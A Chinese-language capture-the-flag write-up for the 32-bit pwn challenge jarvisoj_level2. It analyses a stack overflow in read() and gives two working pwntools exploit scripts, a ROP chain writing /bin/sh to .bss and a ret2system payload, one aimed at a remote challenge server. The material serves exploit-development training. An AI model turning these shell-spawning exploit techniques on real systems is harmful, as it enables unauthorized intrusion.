# jarvisoj_level2

## IDA 逆向分析

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_19-30-17.png)

程序很简单，直接得到了**漏洞位置**，函数名有明显提示，进一步查看`vulnerable_function`函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_19-32-01.png)

由上图可以看到，`read`函数存在栈溢出。函数中有`system`函数，但是没有调用`/bin/sh`



## 程序检查

由下图可知该程序为32位的，且不具有栈保护和没有开启地址随机化。

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_19-34-26.png)

## 漏洞分析

有上述信息可知，该程序存在**栈溢出漏洞**，且程序中已经存在可利用的`system`函数，但是缺少`/bin/sh`，所以我们可以通过设置`gadget`,设置弹跳至`read`函数，并设置其参数，将`/bin/sh`字符串写入,然后弹跳至`system`函数，并使用上述传入的字符串作为参数来获取权限

- 32程序参数通过栈传递，因此需要注意调整栈顶
- `read`函数有三个参数，分别是 `0`表示从输入流读入，第二个参数事输入地址，第三个参数是长度
- `ROPgadget --binary jarvisoj_level2 --only "pop|ret"`  查找对应的gadget
- 写入`/bin/sh`，需要在程序中找到一个可写入的位置，一般是`.bss`段---->用于存储定义却未初始化的数据，一般具有可读可写权限

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_19-41-08.png)

上下两张图，对应说明了`.bss`段的特点

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_19-41-44.png)

## exp

- 将`/bin/sh`写入`.bss`段，然后进行调用

```python
from os import system
from elftools.common.utils import bytelist2string
from pwn import *

context(os = 'linux',arch = 'i386',log_level='debug')
io = process("/home/always/PWN/jarvisoj_level2")
e =ELF("/home/always/PWN/jarvisoj_level2")
system_plt_addr = e.plt["system"]
read_plt_addr = e.plt["read"]
offset = 136 + 4
buff = 0x0804A02C     #.bss段起始地址；只要是在.bss段中任意足够长度地址即可

pop_esi_edi_ebp_ret = 0x08048519
payload = flat(
    [offset*b'A',read_plt_addr,pop_esi_edi_ebp_ret,0,buff,11,system_plt_addr,0,buff])
#payload 原理 是先调用read函数，此时从栈顶 
io.sendafter(b"Input:",payload)
io.sendline('/bin/sh')
io.interactive()
```



上述payload栈的变化大概如下图所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-20_20-10-13.png)



- 在本题中实际上具有`/bin/sh`字符串，可直接利用

该字符串地址为`0x0804A024`

```python
from os import system
from elftools.common.utils import bytelist2string
from pwn import *

context(os = 'linux',arch = 'i386',log_level='debug')
#io = process("/home/always/PWN/jarvisoj_level2")
io = remote("node4.buuoj.cn",25582)
e =ELF("/home/always/PWN/jarvisoj_level2")
system_plt_addr = e.plt["system"]
offset = 136 + 4
bin_sh_addr =0x0804A024
payload = flat(
    [offset*b'A',system_plt_addr,0,bin_sh_addr])
io.sendafter(b"Input:",payload)
io.interactive()
```

